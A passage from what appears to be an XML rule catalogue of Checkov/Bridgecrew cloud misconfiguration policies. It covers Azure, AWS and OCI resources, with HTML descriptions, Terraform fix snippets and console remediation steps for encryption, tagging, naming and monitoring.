<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>Service Fabric provides three levels of protection (None, Sign and EncryptAndSign) for node-to-node communication using a primary cluster certificate. Set the protection level to ensure that all node-to-node messages are encrypted and digitally signed<br/>
#Fix - Buildtime<br/>
##Terraform</p>
<ul>
<li><strong>Resource</strong>: azurerm_service_fabric_cluster</li>
<li><strong>Argument</strong>:  fabric_settings</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Go</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="">resource "azurerm_service_fabric_cluster" "example" {
   ...
+  fabric_settings {
+    name = "Security"
+    parameters = {
+      name = "ClusterProtectionLevel"
+      value = "EncryptAndSign"
    }
  }
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-that-service-fabric-uses-available-three-levels-of-protection-available' target='_blank'> https://docs.bridgecrew.io/docs/ensure-that-service-fabric-uses-available-three-levels-of-protection-available</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-that-service-fabric-uses-available-three-levels-of-protection-available' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_AZURE_CUSTOM_1</key>
    <name>Ensure Azure resources that support tags have Tags</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="azure-resources-that-support-tags-do-not-have-tags"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-azure-resources-that-support-tags-do-not-have-tags"></div>Azure resources that support tags do not have Tags</div><a aria-label="Skip link to Azure resources that support tags do not have Tags" class="heading-anchor-icon fa fa-anchor" href="#azure-resources-that-support-tags-do-not-have-tags"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>Many different types of Azure resources support tags. Tags allow you to add metadata to a resource to help identify ownership, perform cost / billing analysis, and to enrich a resource with other valuable information, such as descriptions and environment names. While there are many ways that tags can be used, we recommend you follow a tagging practice.</p>
<p>View Microsoft's recommended tagging best practices <a href="https://docs.microsoft.com/en-us/azure/cloud-adoption-framework/ready/azure-best-practices/naming-and-tagging" target="_self">here</a>.</p>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">supported_resources</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-text theme-light" data-lang="text" name="supported_resources">azurerm_analysis_services_server
azurerm_api_management
azurerm_api_management_named_value
azurerm_api_management_property
azurerm_app_configuration
azurerm_app_service
azurerm_app_service_certificate
azurerm_app_service_certificate_order
azurerm_app_service_environment
azurerm_app_service_managed_certificate
azurerm_app_service_plan
azurerm_app_service_slot
azurerm_application_gateway
azurerm_application_insights
azurerm_application_insights_web_test
azurerm_application_security_group
azurerm_attestation_provider
azurerm_automation_account
azurerm_automation_dsc_configuration
azurerm_automation_runbook
azurerm_availability_set
azurerm_backup_policy_vm
azurerm_backup_protected_vm
azurerm_bastion_host
azurerm_batch_account
azurerm_bot_channels_registration
azurerm_bot_connection
azurerm_bot_web_app
azurerm_cdn_endpoint
azurerm_cdn_profile
azurerm_cognitive_account
azurerm_communication_service
azurerm_container_group
azurerm_container_registry
azurerm_container_registry_webhook
azurerm_cosmosdb_account
azurerm_custom_provider
azurerm_dashboard
azurerm_data_factory
azurerm_data_lake_analytics_account',
azurerm_data_lake_store
azurerm_data_share_account
azurerm_database_migration_project
azurerm_database_migration_service
azurerm_databox_edge_device
azurerm_databricks_workspace
azurerm_dedicated_hardware_security_module
azurerm_dedicated_host
azurerm_dedicated_host_group
azurerm_dev_test_global_vm_shutdown_schedule
azurerm_dev_test_lab
azurerm_dev_test_linux_virtual_machine
azurerm_dev_test_policy
azurerm_dev_test_schedule
azurerm_dev_test_virtual_network
azurerm_dev_test_windows_virtual_machine
azurerm_devspace_controller
azurerm_digital_twins_instance
azurerm_disk_access
azurerm_disk_encryption_set
azurerm_dns_a_record
azurerm_dns_aaaa_record
azurerm_dns_caa_record
azurerm_dns_cname_record
azurerm_dns_mx_record
azurerm_dns_ns_record
azurerm_dns_ptr_record
azurerm_dns_srv_record
azurerm_dns_txt_record
azurerm_dns_zone
azurerm_eventgrid_domain
azurerm_eventgrid_system_topic
azurerm_eventgrid_topic
azurerm_eventhub_cluster
azurerm_eventhub_namespace
azurerm_express_route_circuit
azurerm_express_route_gateway
azurerm_express_route_port
azurerm_firewall
azurerm_firewall_policy',
azurerm_frontdoor
azurerm_frontdoor_firewall_policy
azurerm_function_app
azurerm_function_app_slot
azurerm_hdinsight_hadoop_cluster
azurerm_hdinsight_hbase_cluster
azurerm_hdinsight_interactive_query_cluster
azurerm_hdinsight_kafka_cluster
azurerm_hdinsight_ml_services_cluster
azurerm_hdinsight_rserver_cluster
azurerm_hdinsight_spark_cluster
azurerm_hdinsight_storm_cluster
azurerm_healthcare_service
azurerm_hpc_cache
azurerm_image
azurerm_integration_service_environment
azurerm_iot_security_solution
azurerm_iot_time_series_insights_gen2_environment
azurerm_iot_time_series_insights_reference_data_set
azurerm_iot_time_series_insights_standard_environment
azurerm_iotcentral_application
azurerm_iothub
azurerm_iothub_dps
azurerm_ip_group
azurerm_key_vault
azurerm_key_vault_certificate
azurerm_key_vault_key
azurerm_key_vault_secret
azurerm_kubernetes_cluster
azurerm_kubernetes_cluster_node_pool
azurerm_kusto_cluster
azurerm_lb
azurerm_linux_virtual_machine
azurerm_linux_virtual_machine_scale_set
azurerm_local_network_gateway
azurerm_log_analytics_cluster
azurerm_log_analytics_linked_service
azurerm_log_analytics_saved_search
azurerm_log_analytics_solution
azurerm_log_analytics_storage_insights
azurerm_log_analytics_workspace
azurerm_logic_app_integration_account
azurerm_logic_app_workflow
azurerm_machine_learning_workspace
azurerm_maintenance_configuration
azurerm_managed_application
azurerm_managed_application_definition
azurerm_managed_disk
azurerm_management_group_template_deployment
azurerm_maps_account
azurerm_mariadb_server
azurerm_media_live_event
azurerm_media_services_account
azurerm_media_streaming_endpoint
azurerm_monitor_action_group
azurerm_monitor_action_rule_action_group
azurerm_monitor_action_rule_suppression
azurerm_monitor_activity_log_alert
azurerm_monitor_autoscale_setting
azurerm_monitor_metric_alert
azurerm_monitor_scheduled_query_rules_alert
azurerm_monitor_scheduled_query_rules_log
azurerm_monitor_smart_detector_alert_rule
azurerm_mssql_database
azurerm_mssql_elasticpool
azurerm_mssql_server
azurerm_mssql_virtual_machine
azurerm_mysql_server
azurerm_nat_gateway
azurerm_netapp_account
azurerm_netapp_pool
azurerm_netapp_snapshot
azurerm_netapp_volume
azurerm_network_connection_monitor
azurerm_network_ddos_protection_plan
azurerm_network_interface
azurerm_network_profile
azurerm_network_security_group
azurerm_network_watcher
azurerm_notification_hub
azurerm_notification_hub_namespace
azurerm_orchestrated_virtual_machine_scale_set
azurerm_point_to_site_vpn_gateway
azurerm_postgresql_server
azurerm_powerbi_embedded
azurerm_private_dns_a_record
azurerm_private_dns_aaaa_record
azurerm_private_dns_cname_record
azurerm_private_dns_mx_record
azurerm_private_dns_ptr_record
azurerm_private_dns_srv_record
azurerm_private_dns_txt_record
azurerm_private_dns_zone
azurerm_private_dns_zone_virtual_network_link
azurerm_private_endpoint
azurerm_private_link_service
azurerm_proximity_placement_group
azurerm_public_ip
azurerm_public_ip_prefix
azurerm_purview_account
azurerm_recovery_services_vault
azurerm_redis_cache
azurerm_redis_enterprise_cluster
azurerm_relay_namespace
azurerm_resource_group
azurerm_resource_group_template_deployment
azurerm_route_filter
azurerm_route_table
azurerm_search_service
azurerm_security_center_automation
azurerm_service_fabric_cluster
azurerm_service_fabric_mesh_application
azurerm_service_fabric_mesh_local_network
azurerm_service_fabric_mesh_secret
azurerm_service_fabric_mesh_secret_value
azurerm_servicebus_namespace
azurerm_shared_image
azurerm_shared_image_gallery
azurerm_shared_image_version
azurerm_signalr_service
azurerm_snapshot
azurerm_spatial_anchors_account
azurerm_spring_cloud_service
azurerm_sql_database
azurerm_sql_elasticpool
azurerm_sql_failover_group
azurerm_sql_server
azurerm_ssh_public_key
azurerm_stack_hci_cluster
azurerm_storage_account
azurerm_storage_sync
azurerm_stream_analytics_job
azurerm_subnet_service_endpoint_storage_policy
azurerm_subscription
azurerm_subscription_template_deployment
azurerm_synapse_spark_pool
azurerm_synapse_sql_pool
azurerm_synapse_workspace
azurerm_tenant_template_deployment
azurerm_traffic_manager_profile
azurerm_user_assigned_identity
azurerm_virtual_desktop_application_group
azurerm_virtual_desktop_host_pool
azurerm_virtual_desktop_workspace
azurerm_virtual_hub
azurerm_virtual_hub_security_partner_provider
azurerm_virtual_machine
azurerm_virtual_machine_extension
azurerm_virtual_machine_scale_set
azurerm_virtual_network
azurerm_virtual_network_gateway
azurerm_virtual_network_gateway_connection
azurerm_virtual_wan
azurerm_vmware_private_cloud
azurerm_vpn_gateway
azurerm_vpn_server_configuration
azurerm_vpn_site
azurerm_web_application_firewall_policy
azurerm_windows_virtual_machine
azurerm_windows_virtual_machine_scale_set
</code></pre></div></div>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime </div><a aria-label="Skip link to Fix - Buildtime " class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-terraform"></div>Terraform</div><a aria-label="Skip link to Terraform" class="heading-anchor-icon fa fa-anchor" href="#terraform"></a></h2>
<p>The example below shows how to tag a security group in Terraform. The syntax is generally the same for any taggable resource type.</p>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Go</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="">resource "azurerm_resource_group" "example" {
  name     = "example-resources"
  location = "West Europe"
}

resource "azurerm_managed_disk" "example" {
  name                 = "acctestmd"
  location             = "West US 2"
  resource_group_name  = azurerm_resource_group.example.name
  storage_account_type = "Standard_LRS"
  create_option        = "Empty"
  disk_size_gb         = "1"

+  tags = {
+    environment = "staging"
  }
}
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-azure-resources-that-support-tags-have-tags' target='_blank'> https://docs.bridgecrew.io/docs/ensure-azure-resources-that-support-tags-have-tags</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-azure-resources-that-support-tags-have-tags' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_AWS_189</key>
    <name>Ensure EBS Volume is encrypted by KMS using a customer managed Key (CMK)</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="aws-ebs-volume-not-encrypted-using-customer-managed-key"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-aws-ebs-volume-not-encrypted-using-customer-managed-key"></div>AWS EBS Volume not encrypted using Customer Managed Key</div><a aria-label="Skip link to AWS EBS Volume not encrypted using Customer Managed Key" class="heading-anchor-icon fa fa-anchor" href="#aws-ebs-volume-not-encrypted-using-customer-managed-key"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>Amazon EBS automatically creates a unique AWS managed key in each Region where you store AWS resources. This KMS key has the alias alias/aws/ebs. By default, Amazon EBS uses this KMS key for encryption. Alternatively, you can specify a symmetric customer managed key that you created as the default KMS key for EBS encryption. Using your own KMS key gives you more flexibility, including the ability to create, rotate, and disable KMS keys.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime</div><a aria-label="Skip link to Fix - Buildtime" class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-terraform"></div>Terraform</div><a aria-label="Skip link to Terraform" class="heading-anchor-icon fa fa-anchor" href="#terraform"></a></h2>
<ul>
<li><strong>Resource</strong>: aws_ebs_volume</li>
<li><strong>Attribute</strong>: kms_key_id - (Optional) The ARN for the KMS encryption key. When specifying kms_key_id, encrypted needs to be set to true. Note: Terraform must be running with credentials which have the GenerateDataKeyWithoutPlaintext permission on the specified KMS key as required by the EBS KMS CMK volume provisioning process to prevent a volume from being created and almost immediately deleted.</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Go</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="">resource "aws_ebs_volume" "example" {
  availability_zone = "us-west-2a"
  size              = 40
+ kms_key_id = "ckv_kms"
  tags = {
    Name = "HelloWorld"
  }
}
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/bc_aws_general_109' target='_blank'> https://docs.bridgecrew.io/docs/bc_aws_general_109</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/bc_aws_general_109' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_AWS_190</key>
    <name>Ensure lustre file systems is encrypted by KMS using a customer managed Key (CMK)</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="ensure-lustre-file-systems-is-encrypted-by-kms-using-a-customer-managed-key-cmk"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-ensure-lustre-file-systems-is-encrypted-by-kms-using-a-customer-managed-key-cmk"></div>Ensure lustre file systems is encrypted by KMS using a customer managed Key (CMK)</div><a aria-label="Skip link to Ensure lustre file systems is encrypted by KMS using a customer managed Key (CMK)" class="heading-anchor-icon fa fa-anchor" href="#ensure-lustre-file-systems-is-encrypted-by-kms-using-a-customer-managed-key-cmk"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>Amazon FSx for Lustre uses a KMS key, either the AWS managed key for Amazon FSx or a custom KMS key, to encrypt and decrypt file system data. All scratch FSx for Lustre file systems are encrypted at rest with keys managed by the service. Data is encrypted using an XTS-AES-256 block cipher. Data is automatically encrypted before being written to the file system, and is automatically decrypted as it is read. The keys used to encrypt scratch file systems at-rest are unique per file system and destroyed after the file system is deleted. For persistent file systems, you choose the KMS key used to encrypt and decrypt data, either the AWS managed key for Amazon FSx or a custom KMS key. You specify which key to use when you create a persistent file system. You can enable, disable, or revoke grants on this KMS key.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime</div><a aria-label="Skip link to Fix - Buildtime" class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-terraform"></div>Terraform</div><a aria-label="Skip link to Terraform" class="heading-anchor-icon fa fa-anchor" href="#terraform"></a></h2>
<ul>
<li><strong>Resource</strong>: aws_fsx_windows_file_system</li>
<li><strong>Argument</strong>: kms_key_id</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Go</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="">resource "aws_fsx_windows_file_system" "example" {
  active_directory_id = aws_directory_service_directory.example.id
  kms_key_id          = aws_kms_key.example.arn
  storage_capacity    = 300
  subnet_ids          = [aws_subnet.example.id]
  throughput_capacity = 1024
}
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/bc_aws_general_110' target='_blank'> https://docs.bridgecrew.io/docs/bc_aws_general_110</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/bc_aws_general_110' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_AWS_191</key>
    <name>Ensure Elasticache replication group is encrypted by KMS using a customer managed Key (CMK)</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="aws-elasticache-replication-group-not-configured-with-cmk-key"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-aws-elasticache-replication-group-not-configured-with-cmk-key"></div>AWS Elasticache replication group not configured with CMK key</div><a aria-label="Skip link to AWS Elasticache replication group not configured with CMK key" class="heading-anchor-icon fa fa-anchor" href="#aws-elasticache-replication-group-not-configured-with-cmk-key"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>ElastiCache for Redis offers default (service managed) encryption at rest, as well as ability to use your own symmetric customer managed AWS KMS keys in AWS Key Management Service (KMS).<br/>
Data stored on SSDs (solid-state drives) in data tiering enabled clusters is always encrypted by default. However, when the cluster is backed up, the snapshot data is not automatically encrypted. Encryption needs to be enabled on the snapshot.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime</div><a aria-label="Skip link to Fix - Buildtime" class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-terraform"></div>Terraform</div><a aria-label="Skip link to Terraform" class="heading-anchor-icon fa fa-anchor" href="#terraform"></a></h2>
<ul>
<li><strong>Resource: </strong>aws_elasticache_replication_group</li>
<li><strong>Attribute:</strong> kms_key_id - (Optional) The ARN of the key that you wish to use if encrypting at rest. If not supplied, uses service managed encryption. Can be specified only if at_rest_encryption_enabled = true.</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Go</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="">resource "aws_elasticache_replication_group" "example" {
  automatic_failover_enabled    = true
  availability_zones            = ["us-west-2a", "us-west-2b"]
  replication_group_id          = "tf-rep-group-1"
  replication_group_description = "test description"
  node_type                     = "cache.m4.large"
  number_cache_clusters         = 2
  parameter_group_name          = "default.redis3.2"
  port                          = 6379

  
  + kms_key_id = "arm:ckv"
  }
}
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/bc_aws_general_111' target='_blank'> https://docs.bridgecrew.io/docs/bc_aws_general_111</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/bc_aws_general_111' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_AZURE_43</key>
    <name>Ensure Storage Accounts adhere to the naming rules</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="storage-account-name-does-not-follow-naming-rules"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-storage-account-name-does-not-follow-naming-rules"></div>Storage Account name does not follow naming rules</div><a aria-label="Skip link to Storage Account name does not follow naming rules" class="heading-anchor-icon fa fa-anchor" href="#storage-account-name-does-not-follow-naming-rules"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>Azure has the following <a href="https://docs.microsoft.com/en-us/azure/storage/common/storage-account-overview#naming-storage-accounts" target="_self">rules for naming</a> your storage account:</p>
<ul>
<li>Names must be between 3 and 24 characters long</li>
<li>Names may contain numbers and lowercase letters only</li>
<li>Your storage account name must be unique</li>
</ul>
<p>This policy ensures that you have not provided an invalid name for your Storage Account.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime</div><a aria-label="Skip link to Fix - Buildtime" class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-terraform"></div>Terraform</div><a aria-label="Skip link to Terraform" class="heading-anchor-icon fa fa-anchor" href="#terraform"></a></h2>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Go</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="">resource "azurerm_storage_account" "camel_case" {
-  name  = "this-Is-Wrong"
+  name  = "thisisright"
}
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-storage-accounts-adhere-to-the-naming-rules' target='_blank'> https://docs.bridgecrew.io/docs/ensure-storage-accounts-adhere-to-the-naming-rules</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-storage-accounts-adhere-to-the-naming-rules' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_OCI_3</key>
    <name>Ensure OCI Block Storage Block Volumes are encrypted with a Customer Managed Key (CMK)</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="oci-block-storage-block-volumes-are-not-encrypted-with-a-customer-managed-keycmk"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-oci-block-storage-block-volumes-are-not-encrypted-with-a-customer-managed-key-cmk"></div>OCI Block Storage Block Volumes are not encrypted with a Customer Managed Key(CMK)</div><a aria-label="Skip link to OCI Block Storage Block Volumes are not encrypted with a Customer Managed Key(CMK)" class="heading-anchor-icon fa fa-anchor" href="#oci-block-storage-block-volumes-are-not-encrypted-with-a-customer-managed-keycmk"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>This policy identifies the OCI Block Storage Volumes that are not encrypted with a Customer Managed Key (CMK). It is recommended that Block Storage Volumes should be encrypted with a Customer Managed Key (CMK), using  Customer Managed Key (CMK), provides an additional level of security on your data by allowing you to manage your own encryption key lifecycle management for the Block Storage Volume.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---runtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-runtime"></div>Fix - Runtime</div><a aria-label="Skip link to Fix - Runtime" class="heading-anchor-icon fa fa-anchor" href="#fix---runtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="oci-console"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-oci-console"></div>OCI Console</div><a aria-label="Skip link to OCI Console" class="heading-anchor-icon fa fa-anchor" href="#oci-console"></a></h2>
<ol>
<li>Login to the OCI Console</li>
<li>Type the resource reported in the alert into the Search box at the top of the Console.</li>
<li>Click the resource reported in the alert from the Resources submenu</li>
<li>Click Assign next to Encryption Key: Oracle managed key.</li>
<li>Select a Vault from the appropriate compartment</li>
<li>Select a Master Encryption Key</li>
<li>Click Assign</li>
</ol>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime</div><a aria-label="Skip link to Fix - Buildtime" class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-terraform"></div>Terraform</div><a aria-label="Skip link to Terraform" class="heading-anchor-icon fa fa-anchor" href="#terraform"></a></h2>
<ul>
<li><strong>Resource</strong>: oci_core_volum</li>
<li><strong>Arguments</strong>: kms_key_id</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Go</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="">resource "oci_core_volume" "pass" {
  #Required
  compartment_id = var.compartment_id
  availability_domain = var.volume_block_volume_replicas_availability_domain

  }
  defined_tags         = { "Operations.CostCenter" = "42" }
  display_name         = var.volume_display_name
  freeform_tags        = { "Department" = "Finance" }
  is_auto_tune_enabled = var.volume_is_auto_tune_enabled
  kms_key_id           = oci_kms_key.test_key.id
  size_in_gbs          = var.volume_size_in_gbs
  size_in_mbs          = var.volume_size_in_mbs
  source_details {
    #Required
    id   = var.volume_source_details_id
    type = var.volume_source_details_type
  }
}
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/oci-block-storage-block-volumes-are-not-encrypted-with-a-customer-managed-key-cmk' target='_blank'> https://docs.bridgecrew.io/docs/oci-block-storage-block-volumes-are-not-encrypted-with-a-customer-managed-key-cmk</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/oci-block-storage-block-volumes-are-not-encrypted-with-a-customer-managed-key-cmk' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_OCI_6</key>
    <name>Ensure OCI Compute Instance has monitoring enabled</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="oci-compute-instance-has-monitoring-disabled"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-oci-compute-instance-has-monitoring-disabled"></div>OCI Compute Instance has monitoring disabled</div><a aria-label="Skip link to OCI Compute Instance has monitoring disabled" class="heading-anchor-icon fa fa-anchor" href="#oci-compute-instance-has-monitoring-disabled"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>This policy identifies the OCI Compute Instances that are configured with Monitoring disabled. It is recommended that Compute Instances should be configured with monitoring is enabled following security best practices.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---runtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-runtime"></div>Fix - Runtime</div><a aria-label="Skip link to Fix - Runtime" class="heading-anchor-icon fa fa-anchor" href="#fix---runtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="oci-console"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-oci-console"></div>OCI Console</div><a aria-label="Skip link to OCI Console" class="heading-anchor-icon fa fa-anchor" href="#oci-console"></a></h2>
<ol>
<li>Login to the OCI Console</li>
<li>Type the resource reported in the alert into the Search box at the top of the Console.</li>
<li>Click the resource reported in the alert from the Resources submenu</li>
<li>Under Resources, click Metrics.</li>
<li>Click Enable monitoring. (If monitoring is not enabled (and the instance uses a supported image), then a button is available to enable monitoring.)</li>
